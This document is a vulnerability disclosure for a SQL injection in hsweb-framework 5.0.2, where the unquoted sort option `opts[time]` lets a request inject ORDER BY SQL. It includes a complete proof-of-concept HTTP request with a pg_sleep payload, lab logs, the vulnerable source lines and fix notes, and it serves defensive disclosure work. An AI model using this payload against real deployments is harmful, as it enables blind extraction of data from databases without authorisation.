### Vulnerability details

**Official website / Product:** https://github.com/hs-web/hsweb-framework

**Repository:** hs-web/hsweb-framework (stars at selection: 8394)

**Vulnerability type:** SQLi

**Vulnerability versions:** 5.0.2 (Maven Central; depends on `org.hswebframework:hsweb-easy-orm-rdb:4.2.2`; lab image based on commit `8a2c61b742b483f8c17436b21b1d00e28697d880`; framework tip `b83a3ff4b1138416ee2d3425eac06272d3e0265c`; same `sorts[].opts.time` logic still present on current 5.0.x default branch)

**Vulnerability URL / Parameter:** `GET /api/test/_query/no-paging` query parameters `sorts[0].type` + `sorts[0].opts[time]` (generic `QueryParamEntity.sorts`; any business endpoint exposing `ReactiveServiceCrudController` / `ServiceQueryController` is reachable)

**Complex:** yes

### Verification procedure

Lab topology (original `labs/hsweb-r57-a5/` and images `hsweb-r57-a5-lab:5.0.2` / `postgres:16` were removed per `lab_images_removed` in `logs/merged/r57-a5.json`; details below match verification time; no Dockerfile for the custom app image remains — third parties must rebuild an equivalent CRUD entry on hsweb-framework 5.0.2 + `hsweb-easy-orm-rdb:4.2.2`):

- App HTTP: `127.0.0.1:23705` → container `8080` (container `hsweb-r57a5-app`, image `hsweb-r57-a5-lab:5.0.2`)
- DB: `postgres:16` (container `hsweb-r57a5-postgres`); network `hsweb-r57-a5_default`
- Dependency: `org.hswebframework:hsweb-easy-orm-rdb:4.2.2`
- Custom scalars: DB provides `first(varchar, timestamp)` / `last(...)` helpers so the ORM-emitted `first(...)` ORDER BY fragment type-checks (TimescaleDB’s aggregate `first` errors in bare ORDER BY; **the injection itself does not depend on the helpers**)
- Unauthenticated entry: lab CRUD `/api/test/**` is open (framework generic `QueryParamEntity` binding)
- Table: `public.t_test` (entity `org.hswebframework.lab.entity.TestEntity`, columns include `id` / `name` / `create_time`)

1. Start the original lab (at verification): in `labs/hsweb-r57-a5/` run `docker compose up -d`; wait for postgres healthy, then app on `23705`. Expected bring-up lines:

```text
Network hsweb-r57-a5_default  Creating
Network hsweb-r57-a5_default  Created
Container hsweb-r57a5-postgres  Creating
Container hsweb-r57a5-postgres  Created
Container hsweb-r57a5-app  Creating
Container hsweb-r57a5-app  Created
Container hsweb-r57a5-postgres  Starting
Container hsweb-r57a5-postgres  Started
Container hsweb-r57a5-postgres  Waiting
Container hsweb-r57a5-postgres  Healthy
Container hsweb-r57a5-app  Starting
Container hsweb-r57a5-app  Started
```

2. Insert two test rows via generic CRUD (snowflake ids / timestamps in the response match the PoC below):

```http
POST /api/test HTTP/1.1
Host: 127.0.0.1:23705
Accept: application/json
Content-Type: application/json
User-Agent: r57-a5-hsweb-poc
Connection: close

{"name":"alpha"}
```

```http
POST /api/test HTTP/1.1
Host: 127.0.0.1:23705
Accept: application/json
Content-Type: application/json
User-Agent: r57-a5-hsweb-poc
Connection: close

{"name":"beta"}
```

3. Send the full PoC below: `sorts[0].type=first` and `sorts[0].opts[time]` containing `.` to bypass identifier quoting. Decoded `opts[time]` is:

```text
t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int
```

i.e. close `first(...)` early and inject `(select 1 from pg_sleep(3))` into `ORDER BY`.
4. Observe ~3s response latency with HTTP 200. curl timing:

```text
time_total=3.020472
```

Control with `pg_sleep(0)` is ~0.01s.
5. Application DEBUG Native SQL shows the injected fragment. Control `pg_sleep(0)` vs PoC `pg_sleep(3)` Native SQL:

```text
2026-11-02T20:25:27.332+08:00 DEBUG 1 --- [tor-tcp-epoll-2] o.hswebframework.lab.entity.TestEntity   : ==>     Native: select t_test."id" as "id" , t_test."name" as "name" , t_test."create_time" as "createTime" from "public".t_test t_test order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(0))::int ) asc limit 10 offset 0
2026-11-02T20:26:01.317+08:00 DEBUG 1 --- [tor-tcp-epoll-2] o.hswebframework.lab.entity.TestEntity   : ==>  Preparing: select t_test."id" as "id" , t_test."name" as "name" , t_test."create_time" as "createTime" from "public".t_test t_test order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int ) asc limit $1 offset $2
2026-11-02T20:26:01.317+08:00 DEBUG 1 --- [tor-tcp-epoll-2] o.hswebframework.lab.entity.TestEntity   : ==>     Native: select t_test."id" as "id" , t_test."name" as "name" , t_test."create_time" as "createTime" from "public".t_test t_test order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int ) asc limit 10 offset 0
2026-11-02T20:26:04.341+08:00 DEBUG 1 --- [tor-tcp-epoll-2] o.hswebframework.lab.entity.TestEntity   : ==>  Preparing: select t_test."id" as "id" , t_test."name" as "name" , t_test."create_time" as "createTime" from "public".t_test t_test order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(0))::int ) asc limit $1 offset $2
2026-11-02T20:26:04.341+08:00 DEBUG 1 --- [tor-tcp-epoll-2] o.hswebframework.lab.entity.TestEntity   : ==>     Native: select t_test."id" as "id" , t_test."name" as "name" , t_test."create_time" as "createTime" from "public".t_test t_test order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(0))::int ) asc limit 10 offset 0
```

Core injected ORDER BY fragment:

```sql
order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int ) asc
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
GET /api/test/_query/no-paging?pageSize=10&sorts%5B0%5D.name=name&sorts%5B0%5D.type=first&sorts%5B0%5D.opts%5Btime%5D=t_test.create_time%29+ASC%2C+%28%28select+1+from+pg_sleep%283%29%29%3A%3Aint HTTP/1.1
Host: 127.0.0.1:23705
Accept: application/json
User-Agent: r57-a5-hsweb-poc
Connection: close

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
transfer-encoding: chunked
Content-Type: application/json

{"message":"success","result":[{"id":"2117231464041361408","name":"alpha","createTime":"2026-11-02T12:24:51.943+00:00"},{"id":"2117231464343351296","name":"beta","createTime":"2026-11-02T12:24:52.014+00:00"}],"status":200,"timestamp":1793622410083}
```

Verification result notes:

- PoC request `time_total=3.020472`, HTTP 200, normal JSON list returned (alpha / beta).
- Control `pg_sleep(0)` ≈ `0.01s`; the delta proves `pg_sleep(3)` executed in the database.
- Application DEBUG Native SQL contains `order by first( t_test."name" , t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int ) asc`, proving `opts.time` is neither parameterized nor column-allowlisted.
- Audited version string `5.0.2`; framework tip `b83a3ff4b1138416ee2d3425eac06272d3e0265c`; lab commit `8a2c61b742b483f8c17436b21b1d00e28697d880`.

### Vulnerability analysis

hsweb-framework passes frontend `QueryParamEntity.sorts` into easy-orm query construction (`BuildParameterQueryOperator#setParam` → `SortOrderFragmentBuilder`). When `sort.type` is the postgres-dialect-registered `first` / `last` (`ValueByTimeFunctionFragmentBuilder`), `sort.opts.time` is treated as a “time column name” and passed to `Dialect.buildColumnFullName`.

When the column name contains `.`, `buildColumnFullName` **returns the raw string without quoting**. An attacker can craft `t_test.create_time) ASC, ((select 1 from pg_sleep(3))::int` to close `first(...)` early and inject arbitrary SQL expressions into `ORDER BY`, enabling time-based or boolean blind SQLi.

Framework docs and example comments claim dynamic queries have “no SQL injection issues,” but this sort-function option path has no column allowlist or parameter binding.

Trigger / sink source (full path and line numbers; dep `hsweb-easy-orm-rdb` 4.2.2 / framework 5.0.2):

```java
# File: hsweb-easy-orm-rdb/src/main/java/org/hswebframework/ezorm/rdb/metadata/dialect/Dialect.java
# Lines: 74-81
default String buildColumnFullName(String tableName, String columnName, boolean changeCase) {
    if (columnName.contains(".")) {
        return columnName; // contains dot → skip quote → injection sink
    }
    ...
    return StringUtils.concat(tableName, ".", getQuoteStart(), ..., columnName, getQuoteEnd());
}
```

```java
# File: hsweb-easy-orm-rdb/src/main/java/org/hswebframework/ezorm/rdb/supports/postgres/ValueByTimeFunctionFragmentBuilder.java
# Lines: 48-75
if (opts != null && opts.containsKey(TIME_COLUMN)) {
    String timeColumn = (String) opts.get(TIME_COLUMN);
    fullTimeColumn = metadata.getDialect().buildColumnFullName(table, timeColumn);
}
...
return new BatchSqlFragments(2, 0)
    .add(FUNCTION)
    .addSql(columnFullName, ",", fullTimeColumn, ")");
```

```java
# File: hsweb-commons/hsweb-commons-crud/src/main/java/org/hswebframework/web/crud/query/QueryAnalyzerImpl.java (QueryHelper path is analogous)
# Lines: 1029-1031
SqlFragments fragments = ofNullable(sort.getType())
    .flatMap(function -> column.metadata.findFeature(FunctionFragmentBuilder.createFeatureId(function)))
    .map(builder -> builder.create(columnName, column.metadata, sort.getOpts()))
```

HTTP entry is the framework’s generic CRUD: `ReactiveServiceQueryController` / `ServiceQueryController` binding `QueryParamEntity` (e.g. sample `TestController implements ReactiveServiceCrudController` → `GET /api/test/_query/no-paging`).

### Fix notes

1. `opts.time` must be allowlisted against current table metadata column names; never concatenate user strings into SQL.
2. Remove or tighten the `columnName.contains(".")` early-return in `buildColumnFullName`; always quote identifiers, or reject inputs with special characters.
3. Restrict sort `type` to a safe function set; bind the second argument of `first`/`last` to metadata columns instead of request opts.
